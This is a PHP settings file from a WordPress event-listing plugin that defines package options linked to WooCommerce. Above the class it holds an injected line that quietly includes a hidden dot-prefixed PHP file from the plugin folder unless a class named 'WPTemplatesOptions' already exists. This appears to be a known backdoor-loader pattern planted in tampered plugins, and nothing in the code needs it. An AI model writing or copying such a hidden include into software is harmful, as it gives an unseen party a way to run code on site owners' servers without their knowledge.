<?php
if (!defined('ABSPATH')) {
	exit();
}

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class EL_Setting_Package extends EL_Abstract_Setting{
	/**
     * setting id
     * @var string
     */
	public $_id = 'package';

	/**
     * _title
     * @var null
     */
	public $_title = null;

	/**
     * $_position
     * @var integer
     */
	public $_position = 11;


	public function __construct()
	{
		$this->_title = __('Package', 'eventlist');
		parent::__construct();
	}

   // render fields
	public function load_field() {
		return
		array(
			array(
				'title' => __( 'Package Settings', 'eventlist' ),
				// 'desc' => __( 'Setup Event Listing at frontend', 'eventlist' ),
				'fields' => array(
					array(
						'type' => 'select',
						'label' => __( 'Enable Package', 'eventlist' ),
						'desc' => __( 'Use package for creating event', 'eventlist' ),
						'atts' => array(
							'id' => 'enable_package',
							'class' => 'enable_package'
						),
						'name' => 'enable_package',
						'options' => array(
							'yes' => __( 'Yes', 'eventlist' ),
							'no' => __( 'No', 'eventlist' )
						),
						'default' => 'no'
					),
					array(
						'type' => 'select_package',
						'label' => __( 'Default Package', 'eventlist' ),
						'desc' => __( 'Add for new user', 'eventlist' ),
						'atts' => array(
							'id' => 'package',
							'class' => 'package'
						),
						'name' => 'package',
						
					),
					array(
						'type' => 'select_woo_page',
						'label' => __( 'Choose a hidden product in Woocommerce', 'eventlist' ),
						'desc' => __( 'This allow to booking a event via WooCommerce', 'eventlist' ),
						'name' => 'product_payment_package',
					),
					array(
						'type' => 'select',
						'label' => __( 'Allow active package when Order status: ', 'eventlist' ),
						'desc' => '',
						'name' => 'allow_active_package_by_order',
						'atts' => array(
							'id' => 'allow_active_package_by_order',
							'class' => 'allow_active_package_by_order',
							'multiple' => 'multiple'
						),
						'options' => array(
							'wc-completed' => __( 'Completed', 'eventlist' ),
							'wc-processing' => __( 'Processing', 'eventlist' ),
							'wc-on-hold' => __( 'Hold-on', 'eventlist' )
						),
						'default' => array( 'wc-completed', 'wc-processing' )
					),
					

				)
			)

		);
	}

}

$GLOBALS['package_settings'] = new EL_Setting_Package();